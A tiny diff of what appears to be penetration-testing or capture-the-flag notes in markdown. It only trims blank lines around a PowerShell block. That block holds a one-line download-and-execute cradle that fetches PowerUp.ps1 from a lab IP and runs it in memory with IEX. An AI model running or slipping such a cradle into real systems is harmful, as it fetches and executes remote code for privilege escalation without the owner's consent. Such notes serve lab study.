@@ -4,8 +4,6 @@
 ```
 
 ```powershell
-
 IEX(New-Object Net.WebClient).downloadString('http://10.10.14.20/PowerUp.ps1')
-
-
 ```
+
